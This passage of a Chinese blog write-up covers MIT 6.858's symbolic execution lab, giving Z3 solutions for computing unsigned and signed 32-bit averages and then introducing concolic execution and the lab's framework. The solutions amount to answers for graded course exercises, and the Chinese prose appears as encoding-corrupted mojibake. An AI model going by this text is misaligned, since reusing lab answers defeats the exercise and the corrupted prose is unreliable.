class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_val</span>(<span class="hljs-params">v, signed</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(v) == z3.BitVecNumRef:<br>        <span class="hljs-keyword">if</span> signed:<br>            v = v.as_signed_long()<br>        <span class="hljs-keyword">else</span>:<br>            v = v.as_long()<br>    <span class="hljs-keyword">return</span> v<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_model</span>(<span class="hljs-params">m, signed</span>):<br>    vals = &#123;&#125;<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> m:<br>        vals[k] = printable_val(m[k], signed)<br>    <span class="hljs-keyword">return</span> vals<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_check</span>(<span class="hljs-params">msg, signed, avg, real_avg</span>):<br>    e = (avg != real_avg)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Checking&quot;</span>, msg, <span class="hljs-string">&quot;using Z3 expression:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;    &quot;</span> + <span class="hljs-built_in">str</span>(e).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\n    &quot;</span>))<br>    solver = z3.Solver()<br>    solver.add(e)<br>    ok = solver.check()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Answer for %s: %s&quot;</span> % (msg, ok))<br><br>    <span class="hljs-keyword">if</span> ok == z3.sat:<br>        m = solver.model()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Example:&quot;</span>, printable_model(m, signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Your average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(avg), signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Real average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(real_avg), signed))<br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼ŒZ3 æ±‚è§£å™¨å¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°äº†è¿™æ ·çš„å€¼ï¼š</p><p><img src="https://s2.loli.net/2022/12/12/LekmYMWvfAUSNwy.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 1ï¼šé€šè¿‡ä¿®æ”¹  <code>int-avg.py</code> ä¸­çš„ <code>u_avg = ...</code> ä¸€è¡Œï¼Œå®ç°ä¸€ä¸ªæ­£ç¡®çš„å‡½æ•°ï¼Œä»¥åœ¨ 32 ä½è¿ç®—ä¸‹æ­£ç¡®è®¡ç®—å‡º a ä¸ b çš„æ— ç¬¦å·å¹³å‡å€¼ï¼Œä¸èƒ½æ”¹å˜æ“ä½œæ•°çš„ä½å®½</p><blockquote><p><strong>Exercise 1.</strong> Implement a correct function to compute the unsigned average of <code>a</code> and <code>b</code> using only 32-bit arithmetic, by modifying the <code>u_avg = ...</code> line in <code>int-avg.py</code>.</p><p>For the purposes of this exercise, you are not allowed to change the bit-widths of your operands. This is meant to represent the real world, where you cannot just add one more bit to your CPUâ€™s register width.</p><p>You may find it helpful to search online for correct ways to perform fixed-width integer arithmetic. The book <a href="https://web.archive.org/web/20190915025154/http://www.hackersdelight.org/">Hackerâ€™s Delight</a> by Henry S. Warren is a particularly good source of such tricks.</p><p>Check your averaging function by re-running <strong>.&#x2F;int-avg.py</strong> or <strong>make check</strong>. If your implementation is correct, <code>int-avg.py</code> should produce the message <code>Answer for unsigned avg: unsat</code>.</p></blockquote><p>è¿™é‡Œç¬”è€…ç»™å‡ºä¸€ä¸ªæ¯”è¾ƒç¬¨çš„è§£æ³•ï¼ˆæ¯•ç«Ÿç¬”è€…çš„è„‘å­:  (ä¹Ÿæƒ³ä¸å‡ºå•¥èªæ˜è§£æ³• ï¼‰ï¼š</p><ul><li><strong><code>(a / 2) + (b / 2) + ((a % 2) + (b % 2)) / 2</code></strong></li></ul><p>è¿™ä¸ªç®—æ³•çš„æ€è·¯æ¯”è¾ƒç®€å•ï¼Œæœ€åˆçš„å‡ºå‘ç‚¹å°±æ˜¯ä¸¤æ•°ä¹‹å’Œçš„å¹³å‡å€¼ä¸ä¼šè¶…å‡º 2<sup>32</sup>ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦å…ˆå°†ä¸¤æ•°åˆ†åˆ«é™¤ä»¥2å†ç›¸åŠ å°±ä¸ä¼šå‘ç”Ÿæº¢å‡ºäº†ï¼Œä½†æ˜¯å¥‡æ•°é™¤ä»¥2ä¼šä¸¢å¤± 0.5ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªæ•°éƒ½æ˜¯å¥‡æ•°çš„è¯æœ€åçš„ç»“æœä¼šä¸¢æ‰1ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å†å°†å…¶åŠ ä¸Šå³å¯</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ Z3 <strong>é»˜è®¤ä¸ºå¸¦ç¬¦å·è¿ç®—</strong>ï¼Œæ•…è¿™é‡Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>z3.UDiv()</code> æ¥è¿›è¡Œ<strong>æ— ç¬¦å·</strong>é™¤æ³•è¿ç®—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">u_avg = z3.UDiv(a, <span class="hljs-number">2</span>) + z3.UDiv(b, <span class="hljs-number">2</span>) + ((a % <span class="hljs-number">2</span>) + (b % <span class="hljs-number">2</span>)) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œ <code>make check</code>ï¼ŒæˆåŠŸé€šè¿‡ Exercise 1ï¼š</p><p><img src="https://s2.loli.net/2022/12/12/RhY7t1pxyVSb5eH.png" alt="image.png"></p><p>é™¤äº†è¿™ä¸ªç®—æ³•ä¹‹å¤–ï¼Œç¬”è€…è¿˜äº†è§£åˆ°æœ‰ä¸€ç§ç®—æ³•æ˜¯åˆ©ç”¨<strong>ä½è¿ç®—</strong>æ¥è¿›è¡Œè®¡ç®—ï¼š</p><ul><li><code>(a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li></ul><p>è¿™ä¸ªç®—æ³•çš„åŸºæœ¬åŸç†æ˜¯å…ˆæå–å‡º<strong>å…¬æœ‰éƒ¨åˆ†</strong>ï¼Œå†è®¡ç®—<strong>ç§æœ‰éƒ¨åˆ†çš„å¹³å‡å€¼</strong>ï¼Œæœ€åç›¸åŠ å³å¯å¾—åˆ°ç»“æœï¼›è¿™ä¸ªç®—æ³•ä¹Ÿèƒ½é€šè¿‡ Exercise 1 ï¼Œè¿™é‡Œå°±ä¸é‡å¤è´´å›¾äº†</p><p>æ¥ä¸‹æ¥æ˜¯ Challenge 1ï¼šé€šè¿‡ä¿®æ”¹  <code>int-avg.py</code> ä¸­çš„ <code>s_avg = ...</code> ä¸€è¡Œï¼Œå®ç°ä¸€ä¸ªæ­£ç¡®çš„å‡½æ•°ï¼Œä»¥åœ¨ 32 ä½è¿ç®—ä¸‹æ­£ç¡®è®¡ç®—å‡º a ä¸ b çš„<strong>æœ‰ç¬¦å·å¹³å‡å€¼</strong></p><blockquote><p><em>Challenge! (optional)</em> For extra credit, figure out how to compute the average of two 32-bit <em>signed</em> values. Modify the <code>s_avg = ...</code> line in <code>int-avg.py</code>, and run <strong>.&#x2F;int-avg.py</strong> or <strong>make check</strong> to check your answer. Keep in mind the direction of rounding: 3&#x2F;2&#x3D;1 and -3&#x2F;2&#x3D;-1, so so the average of 1 and 2 should be 1, and the average of -2 and -1 should be -1.</p><p>As you explore signed arithmetic, you may find it useful to know that Z3 has two different modulo-like operators. The first is signed modulo, which you get by using <code>a % b</code> in the Python Z3 API. Here, the sign of the result follows the sign of the divisor (i.e., <code>b</code>). For example, <code>-5 % 2 = 1</code>. The second is signed remainder, which you get by using <code>z3.SRem(a, b)</code>. Here, the sign of the result follows the sign of the dividend (i.e., <code>a</code>). With the same example inputs, <code>z3.SRem(-5, 2) = -1</code>.</p></blockquote><p>å¯¹äºå¸¦ç¬¦å·å€¼çš„è¿ç®—è€Œè¨€ï¼Œé™åˆ¶åœ¨ 32 ä½å†…çš„æ­£ç¡®è®¡ç®—ä¾¿æ²¡æœ‰é‚£ä¹ˆç®€å•äº†ï¼Œè‹¥æˆ‘ä»¬ç›´æ¥ç”¨ä¸Šé¢çš„å¼å­è¿›è¡Œè®¡ç®—åˆ™å¾ˆå®¹æ˜“è¢« Z3 æ‰¾åˆ°èƒ½å¯¼è‡´è¿ç®—ç»“æœé”™è¯¯çš„ä¾‹å­ï¼š</p><p><img src="https://s2.loli.net/2022/12/12/VMQFBdz4eICN9qg.png" alt="image.png"></p><p>ä¸ºä»€ä¹ˆåœ¨æœ‰ç¬¦å·é™¤æ³•ä¸‹è®¡ç®—å‡ºæ¥çš„ç»“æœä¸ä¸€è‡´å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºåœ¨é¢˜ç›®ä¸­<del>MIT éå¸¸SBåœ°</del>å¯¹äºæ­£æ•°é™¤æ³•å…¶é€‰æ‹©<strong>å‘ä¸‹å–æ•´</strong>ï¼Œå¯¹äºè´Ÿæ•°é™¤æ³•çš„æˆªæ–­ï¼Œå…¶é€‰æ‹©çš„æ˜¯<strong>å‘ä¸Šå–æ•´</strong>ï¼Œä½†æˆ‘ä»¬çš„ç®—æ³•æ˜¯<strong>æ­£æ•°ä¸è´Ÿæ•°çš†å‘ä¸‹å–æ•´</strong>ï¼Œå› æ­¤è®¡ç®—ç»“æœå°±å‡ºç°äº†åå·®</p><p>ç”±äºæ­£æ•°éƒ¨åˆ†æ²¡æœ‰é—®é¢˜ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬éœ€è¦å¯¹è®¡ç®—ç»“æœä¸ºè´Ÿæ•°çš„æƒ…å†µè¿›è¡Œç‰¹æ®ŠåŒ–å¤„ç†ï¼Œ<strong>åœ¨ç»“æœä¸ºè´Ÿæ•°æ—¶å°†å‘ä¸‹å–æ•´å˜ä¸ºå‘ä¸Šå–æ•´</strong>ï¼Œå› æ­¤æœ€åçš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š</p><ul><li><code>tmp = (a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li><li><code>res = tmp + ((tmp &gt;&gt; 31) &amp; (a ^ b))</code></li></ul><p><strong>é¦–å…ˆæŒ‰ç…§æˆ‘ä»¬åŸæ¥çš„å…¬å¼è®¡ç®—å‡ºå‘ä¸‹å–æ•´çš„ç»“æœï¼Œæ¥ä¸‹æ¥å¯¹å…¶ç¬¦å·ä½è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥ä¸º 1 åˆ™å†åˆ¤æ–­å…¶ç§æœ‰éƒ¨åˆ†å¹³å‡å€¼çš„è®¡ç®—æ˜¯å¦å‘ç”Ÿæˆªæ–­ï¼ˆå³ç§æœ‰éƒ¨åˆ†å’Œæ˜¯å¦ä¸ºå¥‡æ•°ï¼‰ï¼Œè‹¥æ˜¯åˆ™è¯´æ˜ç»“æœå‘ç”Ÿäº†å‘ä¸‹å–æ•´ï¼Œæ­¤æ—¶å˜ä¸ºå‘ä¸Šå–æ•´å³å¯</strong></p><p>ç”±äºè¦å¯¹ç¬¦å·ä½è¿›è¡Œåˆ¤æ–­ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ <code>z3.LShR()</code> å°†åˆå§‹è¿ç®—ç»“æœä½œä¸ºæ— ç¬¦å·æ•´å‹è¿›è¡Œå³ç§»æ“ä½œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp = (a &amp; b) + ((a ^ b) &gt;&gt; <span class="hljs-number">1</span>)<br>s_avg = tmp + (z3.LShR(tmp, <span class="hljs-number">31</span>) &amp; (a ^ b))<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼ŒæˆåŠŸé€šè¿‡ Challenge 1ï¼š</p><p><img src="https://s2.loli.net/2022/12/13/mLWgZvYRqnXSJfx.png" alt="image.png"></p><h2 id="Interlude-what-are-symbolic-and-concolic-execution"><a href="#Interlude-what-are-symbolic-and-concolic-execution" class="headerlink" title="Interlude: what are symbolic and concolic execution?"></a>Interlude: what are symbolic and concolic execution?</h2><p>æ­£å¦‚æˆ‘ä»¬å‰é¢åœ¨ EXE çš„è®ºæ–‡ä¸­æ‰€è§ï¼Œç¬¦å·æ‰§è¡Œæ˜¯ä¸€ç§é€šè¿‡è§‚æµ‹ç¨‹åºåœ¨ä¸åŒè¾“å…¥ä¸‹å¦‚ä½•è¡¨ç°æ¥è¿›è¡Œç¨‹åºæµ‹è¯•çš„æ–¹æ³•ï¼Œé€šå¸¸è€Œè¨€å…¶ç›®çš„æ˜¯ä¸ºäº†è·å¾—æ›´é«˜çš„ <strong><a href="https://en.wikipedia.org/wiki/Code_coverage">ä»£ç è¦†ç›–ç‡</a></strong> ï¼ˆcode coverageï¼‰æˆ–æ˜¯ <strong>è·¯å¾„è¦†ç›–ç‡</strong> ï¼ˆpath coverageï¼‰ï¼Œåœ¨å®‰å…¨ä¸­å…¶æ¯”ä¼ ç»Ÿä»£ç æ‰§è¡Œæ›´èƒ½è§¦å‘ç½•è§çš„å¯èƒ½åŒ…å«æ¼æ´çš„ä»£ç è·¯å¾„</p><p>ä»æ›´é«˜å±‚æ¬¡è€Œè¨€ï¼Œè‹¥æˆ‘ä»¬è¦æ„å»ºä¸€ä¸ªç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼Œæˆ‘ä»¬éœ€è¦è§£å†³ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>ç”±äºç¨‹åºåŒ…å«åŸºäºè¾“å…¥çš„ä¸­é—´å€¼ï¼ˆä¾‹å¦‚è¾“å…¥ä¸¤ä¸ªæ•´å‹å¹¶è®¡ç®—å¹³å‡å€¼ï¼Œå¹¶å­˜æ”¾åœ¨ä¸€äº›å˜é‡ä¸­ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦è®°ä½è¾“å…¥ä¸è¿™äº›ä¸­é—´å€¼é—´çš„å…³ç³»ï¼Œé€šå¸¸è¿™é€šè¿‡å…è®¸å˜é‡æˆ–å†…å­˜ä½ç½®æœ‰  <em>å…·ä½“çš„</em> ï¼ˆconcreteï¼Œä¾‹å¦‚ 114514 è¿™æ ·çš„å®é™…å€¼ï¼‰ æˆ–  <em>ç¬¦å·çš„</em>  ï¼ˆsymbolicï¼Œä¾‹å¦‚æˆ‘ä»¬åœ¨ä¸Šä¸€å°èŠ‚æ„å»ºçš„ç¬¦å·å˜é‡ï¼‰ å€¼</li><li>æˆ‘ä»¬éœ€è¦æ ¹æ®è¾“å…¥æ¥ç¡®å®šè¦æ‰§è¡Œçš„æ§åˆ¶æµåˆ†æ”¯ï¼Œè¿™å½’ç»“äºåœ¨ç¨‹åºæ¯æ¬¡å‘ç”Ÿåˆ†æ”¯æ—¶æ„å»ºç¬¦å·çº¦æŸï¼Œåœ¨ç¨‹åºé€‰æ‹©ä¸€äº›ç‰¹å®šåˆ†æ”¯æ—¶æè¿°å¸ƒå°”æ¡ä»¶ï¼ˆä»¥ç¨‹åºåŸæœ‰è¾“å…¥çš„å½¢å¼ï¼‰ï¼›ç”±äºæˆ‘ä»¬æŒç»­ä¿å­˜ä¸­é—´å€¼ä¸ç¨‹åºåŸæœ‰è¾“å…¥çš„é—´éš™ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦é€šè¿‡åŸæœ‰è¾“å…¥æ¥è®¡ç®—çº¦æŸï¼Œè¿™äº›çº¦æŸå°±åƒæˆ‘ä»¬åœ¨å‰æ–‡ä¸­ç”¨æ¥å¯»æ‰¾æ•´å‹ä¸­æ¼æ´çš„çº¦æŸï¼›ç¡®å®šæ§åˆ¶æµçº¦æŸéå¸¸é‡è¦ï¼Œå› ä¸ºè‹¥ç¨‹åºåˆå§‹æ—¶è¿›å…¥äº†ç‰¹å®šåˆ†æ”¯è·¯å¾„ï¼Œæˆ‘ä»¬æƒ³è¦çŸ¥é“å¦‚ä½•è®©ä»–èµ°åˆ°å¦ä¸€æ¡è·¯å¾„æ¥å¯»æ‰¾æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œåœ¨ EXE çš„è®ºæ–‡ä¸­ä½¿ç”¨äº†ä¸€ä¸ª C-to-C çš„ç¿»è¯‘å™¨æ¥åœ¨æ‰€æœ‰çš„åˆ†æ”¯ä¸Šæ’å…¥ä»–ä»¬çš„ä»£ç </li><li>å¯¹äºæ¯ä¸€æ¡ä¸Šè¿°åˆ†æ”¯ï¼Œæˆ‘ä»¬éœ€è¦å†³å®šæ˜¯å¦æœ‰ä¸€ä¸ªè¾“å…¥èƒ½å¤Ÿè®©ç¨‹åºåœ¨ä¸€æ¡åˆ†æ”¯ä¸Šæ‰§è¡Œå¦ä¸€æ¡è·¯å¾„ï¼ˆæ›´å‡†ç¡®åœ°è¯´ï¼Œæˆ‘ä»¬è€ƒè™‘æ•´ä¸ªæ§åˆ¶æµè·¯å¾„è€Œéå•ä¸ªè·¯å¾„ï¼‰ï¼Œè¿™å¸®åŠ©æˆ‘ä»¬åœ¨ç¨‹åºä¸­å¯»æ‰¾å¯ä»¥è®©æˆ‘ä»¬é€šè¿‡è°ƒæ•´è¾“å…¥æ¥å½±å“çš„æ§åˆ¶æµæ¡ä»¶ï¼Œæ‰€æœ‰çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿéƒ½åŸºäº SMT æ±‚è§£å™¨æ¥å®Œæˆè¿™äº›å·¥ä½œ</li><li>æˆ‘ä»¬éœ€è¦ç¡®å®šæˆ‘ä»¬åœ¨æµ‹è¯•ä¸­å¯»æ‰¾çš„æ˜¯ä»€ä¹ˆï¼Œè¿™æ˜¯æˆ‘ä»¬ä»ç¨‹åºä¸­ç¡®ä¿  <em>ä¸å˜é‡</em>  ï¼ˆinvariantï¼‰æ¥è€ƒè™‘çš„æœ€ä½³æ–¹æ³•ï¼Œè€Œç¬¦å·æ‰§è¡Œå¯»æ‰¾æ”¹å˜è¿™äº›å¸¸é‡çš„è¾“å…¥ï¼ˆ<del>ğŸ‘´ä¹Ÿæ²¡å’‹è¯»æ˜ç™½ï¼Œå¯ä»¥çœ‹å®éªŒæ‰‹å†ŒåŸå¥</del>ï¼‰ï¼›æˆ‘ä»¬å¯ä»¥å¯»æ‰¾çš„äº‹ç‰©ä¹‹ä¸€æ˜¯<strong>ç¨‹åºå´©æºƒ</strong>ï¼ˆcrashesï¼Œå³ä¸å˜é‡æ˜¯  <em>æˆ‘ä»¬çš„ç¨‹åºä¸åº”å½“å´©æºƒ</em>  ï¼‰ï¼Œåœ¨ C ç¨‹åºä¸­è¿™éå¸¸æœ‰æ„ä¹‰ï¼Œå› ä¸º crashes é€šå¸¸æŒ‡ç¤ºäº†ä»£è¡¨æ¼æ´çš„å†…å­˜æŸåï¼Œåœ¨ Python è¿™æ ·æ›´é«˜çº§çš„è¯­è¨€ä¸­åœ¨è®¾è®¡ä¸Šå¹¶ä¸å­˜åœ¨å†…å­˜æŸåï¼Œä½†æˆ‘ä»¬ä»ç„¶å¯ä»¥å¯»æ‰¾å¦‚ Python ä»£ç çº§çš„ä»£ç æ³¨å…¥æ”»å‡»ï¼ˆä¾‹å¦‚ <code>eval()</code> ï¼‰æˆ–æ˜¯ç‰¹å®šäºæŸç§åº”ç”¨çš„å½±å“å®‰å…¨çš„ä¸å˜é‡</li><li>æœ€ç»ˆï¼Œå¯¹äºç»™å‡ºç¨‹åºä¸­æ‰€æœ‰å¯èƒ½æ‰§è¡Œçš„æ§åˆ¶æµè·¯å¾„ï¼Œæˆ‘ä»¬éœ€è¦å†³å®šè¯¥å°è¯•å“ªæ¡è·¯å¾„ï¼Œå› ä¸ºè·¯å¾„æ•°é‡ä¼šéšç€ç¨‹åºè§„æ¨¡çš„å¢å¤§è€Œå¿«é€Ÿå¢é•¿ï¼Œæˆ‘ä»¬ä¸å¯èƒ½å°è¯•æ‰€æœ‰çš„è·¯å¾„ï¼Œå› æ­¤ç¬¦å·æ‰§è¡Œç³»ç»Ÿé€šå¸¸åŒ…å«ç¡®å®šå“ªä¸€æ¡è·¯å¾„æ›´æœ‰å¸Œæœ›å‘ç°ç ´åä¸å˜é‡çš„æŸç§  <em>è°ƒåº¦å™¨</em>  ï¼ˆschedulerï¼‰æˆ–  <em>æœç´¢ç­–ç•¥</em>  ï¼ˆsearch strategyï¼‰ï¼Œä¸€ä¸ªç®€å•çš„æœç´¢ç­–ç•¥ä¾‹å­ä¾¿æ˜¯å°è¯•æœªæ‰§è¡Œè¿‡çš„è·¯å¾„ï¼Œè¿™ä»£è¡¨ç€æ›´é«˜çš„ä»£ç è¦†ç›–ç‡ä¸æœªè¢«å‘ç°çš„æ¼æ´çš„å­˜åœ¨çš„å¯èƒ½æ€§</li></ul><p>ä¸ç¬¦å·æ‰§è¡Œç›¸å¯¹çš„ä¸€ä¸ªé€‰æ‹©æ˜¯  <a href="https://en.wikipedia.org/wiki/Fuzz_testing">fuzzing</a> ï¼ˆåˆç§° fuzz-testingï¼Œæ¨¡ç³Šæµ‹è¯•ï¼‰ï¼Œå…¶é€‰æ‹©äº†ä¸€ä¸ªéšæœºåŒ–æ–¹æ¡ˆï¼šä¸åŒäºå…³æ³¨è§¦å‘åº”ç”¨ä¸­ä¸åŒä»£ç è·¯å¾„çš„åŸå› ï¼Œfuzzing ä¼šåˆ›å»ºéšæœºçš„å…·ä½“å€¼äº¤ç»™ç¨‹åºæ‰§è¡Œå¹¶æ£€æŸ¥å…¶è¡Œä¸ºï¼›è™½ç„¶è¿™æ¯”ç¬¦å·æ‰§è¡Œæ›´ç®€å•ï¼Œä½†é€šå¸¸å¾ˆéš¾æ„é€ èƒ½æ»¡è¶³ç¨‹åºä»£ç ä¸­ä¸€äº›ç‰¹å®šæƒ…å†µçš„è¾“å…¥</p><p>æ„å»ºç¬¦å·æ‰§è¡Œç³»ç»Ÿçš„ä¸€ä¸ªæŒ‘æˆ˜æ˜¯æˆ‘ä»¬çš„ç³»ç»Ÿéœ€è¦çŸ¥é“å¦‚ä½•åœ¨ç¬¦å·å€¼ä¸Šæ‰§è¡Œæ‰€æœ‰å¯èƒ½çš„æ“ä½œï¼ˆä¸Šé¢çš„ Step 1 &amp; 2ï¼‰ï¼Œåœ¨æœ¬ Lab ä¸­æˆ‘ä»¬å°†åœ¨ Python å¯¹è±¡ï¼ˆæ›´å‡†ç¡®åœ°è¯´ï¼Œæ•´å‹ä¸å­—ç¬¦ä¸²ï¼‰ä¸Šå®è·µï¼Œå¯¹äºç¬¦å·æ‰§è¡Œè€Œè¨€è¿™å¾ˆæœ‰æŒ‘æˆ˜æ€§ï¼Œå› ä¸º Python å¯¹è±¡å¯ä»¥å®ç°çš„æ“ä½œæœ‰å¾ˆå¤š</p><p>å¹¸è¿çš„æ˜¯æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªæ›´ç®€å•çš„é€‰æ‹©â€”â€”  <em>æ··åˆæ‰§è¡Œ</em>  ï¼ˆ<strong>concolic execution</strong>ï¼‰ï¼Œä»‹äºå®Œå…¨éšæœºçš„æ¨¡ç³Šæµ‹è¯•ä¸å®Œå…¨çš„ç¬¦å·æ‰§è¡Œä¹‹é—´ï¼Œç›¸è¾ƒäºè·Ÿè¸ªçº¯å‡€çš„ç¬¦å·å€¼ï¼ˆå¦‚ EXE ä¸­æ‰€åšï¼‰ï¼Œå…¶æ€æƒ³æ˜¯ï¼šå¯¹äºä»è¾“å…¥ä¸­å¾—åˆ°çš„å˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥<strong>åŒæ—¶ä¿å­˜ä¸€ä¸ªå…·ä½“å€¼ä¸ä¸€ä¸ªç¬¦å·å€¼</strong>ï¼Œç”±æ­¤ï¼š</p><ul><li>è‹¥æˆ‘ä»¬çš„ concolic system çŸ¥é“åº”ç”¨çš„è¡Œä¸ºï¼Œæˆ‘ä»¬å¯ä»¥åƒç¬¦å·æ‰§è¡Œé‚£æ ·è¿è¡Œï¼ˆé™¤äº†æˆ‘ä»¬è¿˜ä¼šåŒæ—¶ä¼ æ’­æ¯ä¸ªå€¼çš„ concrete éƒ¨åˆ†ï¼‰ï¼›ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸¤ä¸ª concolic æ•´å‹å˜é‡ <code>aa</code> ä¸ <code>bb</code>ï¼Œå…¶æœ‰ç€å…·ä½“å€¼ <code>5</code> ä¸ <code>6</code> ï¼Œå¹¶å¯¹åº”ç¬¦å·è¡¨è¾¾å¼ <code>a</code> ä¸  <code>b</code>ï¼Œæ­¤æ—¶è‹¥åº”ç”¨åˆ›å»ºäº†ä¸€ä¸ªå˜é‡ <code>cc = aa + bb</code>ï¼Œå…¶ä¼šåŒæ—¶æœ‰ç€å…·ä½“å€¼ <code>11</code> åŠç¬¦å·è¡¨è¾¾å¼ <code>a + b</code>ï¼›ç±»ä¼¼åœ°ï¼Œè‹¥åº”ç”¨åœ¨ <code>cc == 12</code> çš„åˆ†æ”¯ä¸Šæ‰§è¡Œï¼Œç¨‹åºå¯ä»¥åƒåˆ†æ”¯ä¸ºå‡ä¸€æ ·æ‰§è¡Œï¼Œå¹¶è®°å½•å¯¹åº”çš„ç¬¦å·åˆ†æ”¯æ¡ä»¶ <code>a + b != 12</code></li><li>è‹¥æˆ‘ä»¬çš„ concolic system ä¸çŸ¥é“åº”ç”¨çš„å½“å‰è¡Œä¸ºï¼Œåº”ç”¨å°†åªä¼šå¾—åˆ°å…·ä½“çš„å€¼ï¼›ä¾‹å¦‚è‹¥åº”ç”¨å°† <code>cc</code> å†™å…¥æ–‡ä»¶ä¸­ï¼Œæˆ–è€…æ˜¯ä¼ é€’åˆ°å¤–éƒ¨åº“ä¸­ï¼Œä»£ç ä»å¯ä»¥ä½¿ç”¨å…·ä½“å€¼ <code>11</code> å¦‚åŒåº”ç”¨æ­£å¸¸è¿è¡Œé‚£æ ·ç»§ç»­æ‰§è¡Œ</li></ul><p>å¯¹äºæœ¬ lab è€Œè¨€ï¼Œæ··åˆæ‰§è¡Œçš„å¥½å¤„æ˜¯æˆ‘ä»¬å¹¶ä¸éœ€è¦å®Œå…¨å®Œæˆå¯¹ç¬¦å·å€¼çš„æ“ä½œæ”¯æŒï¼Œæˆ‘ä»¬åªéœ€è¦æ”¯æŒè¶³å¤Ÿå‘ç°æ¼æ´çš„æ“ä½œå³å¯ï¼ˆå®é™…ä¸Šå¤§éƒ¨åˆ†æŒ–æ´ç³»ç»Ÿä¹Ÿæ˜¯å¦‚æ­¤ï¼‰ï¼Œä¸è¿‡è‹¥åº”ç”¨æ‰§è¡Œäº†æˆ‘ä»¬æ‰€ä¸æ”¯æŒçš„æ“ä½œï¼Œæˆ‘ä»¬å°†å¤±å»å¯¹ç¬¦å·éƒ¨åˆ†çš„è·Ÿè¸ªï¼Œå¹¶æ— æ³•å¯¹è¿™äº›è·¯å¾„è¿›è¡Œç¬¦å·æ‰§è¡Œå¼çš„ï¼ˆsymbolic-execution-styleï¼‰æ¢ç´¢ï¼Œè‹¥æƒ³äº†è§£æ›´å¤šå¯ä»¥å‚è§  <a href="http://css.csail.mit.edu/6.858/2022/readings/dart.pdf">DART paper</a> </p><h2 id="Concolic-execution-for-integers"><a href="#Concolic-execution-for-integers" class="headerlink" title="Concolic execution for integers"></a>Concolic execution for integers</h2><p>é¦–å…ˆæˆ‘ä»¬å°†ä¸ºæ•´å‹å€¼æ„å»ºä¸€ä¸ªæ··åˆæ‰§è¡Œç³»ç»Ÿï¼Œæœ¬ Lab ä¸ºæˆ‘ä»¬çš„æ··åˆæ‰§è¡Œæä¾›çš„æ¡†æ¶ä»£ç ä½äº <code>symex/fuzzy.py</code> ä¸­ï¼Œå…¶å®ç°äº†å‡ ä¸ªé‡è¦çš„æŠ½è±¡å±‚ï¼š</p><ul><li><p><strong>æŠ½è±¡è¯­æ³•æ ‘</strong>ï¼ˆThe ASTï¼‰ï¼šä¸æ­¤å‰æˆ‘ä»¬åœ¨ <code>int-avg.py</code> ä¸­ä½¿ç”¨ Z3 è¡¨è¾¾å¼æ¥è¡¨ç¤ºç¬¦å·å€¼æ‰€ä¸åŒçš„æ˜¯ï¼Œæœ¬ Lab æ„å»ºäº†å…¶è‡ªå·±çš„æŠ½è±¡è¯­æ³•æ ‘ï¼ˆabstract syntax treeï¼‰æ¥è¡¨è¾¾ç¬¦å·è¡¨è¾¾å¼ï¼Œä¸€ä¸ª AST èŠ‚ç‚¹å¯ä»¥æ˜¯ä¸€ä¸ªç®€å•çš„å˜é‡ï¼ˆ <code>sym_str</code> æˆ– <code>sym_int</code> å¯¹è±¡ï¼‰ã€ä¸€ä¸ªå¸¸é‡ï¼ˆ<code>const_int</code>ã€<code>const_str</code> æˆ– <code>const_bool</code> å¯¹è±¡ï¼‰ã€æˆ–æ˜¯ä¸€äº›å°†å…¶ä»– AST èŠ‚ç‚¹ä½œä¸ºå‚æ•°çš„å‡½æ•°æˆ–æ“ä½œç¬¦ï¼ˆä¾‹å¦‚ <code>sym_eq(a, b)</code> è¡¨ç¤ºå¸ƒå°”è¡¨è¾¾å¼ <code>a==b</code>ï¼Œå…¶ä¸­ <code>a</code> ä¸ <code>b</code> éƒ½æ˜¯ AST èŠ‚ç‚¹ï¼Œæˆ–æ˜¯ <code>sym_plus(a, b)</code> 